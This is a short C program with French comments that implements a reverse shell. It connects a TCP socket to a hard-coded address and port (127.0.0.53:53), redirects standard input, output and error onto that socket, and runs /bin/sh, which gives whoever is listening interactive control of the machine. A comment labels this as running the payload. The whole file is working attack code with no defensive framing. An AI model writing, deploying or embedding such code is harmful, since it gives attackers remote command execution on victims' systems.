#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
    // Adresse IP et port du serveur
    char *ip = "127.0.0.53";
    int port = 53;

    // Création de la socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("Erreur lors de la création de la socket");
        exit(EXIT_FAILURE);
    }

    // Connexion au serveur
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Erreur lors de la connexion au serveur");
        exit(EXIT_FAILURE);
    }

    // Exécution du payload (par exemple, en envoyant des commandes shell)
    dup2(sockfd, 0);  // Redirige stdin vers la connexion
    dup2(sockfd, 1);  // Redirige stdout vers la connexion
    dup2(sockfd, 2);  // Redirige stderr vers la connexion

    // Exécute un shell
    execl("/bin/sh", "/bin/sh", NULL);

    close(sockfd);
    return 0;
}
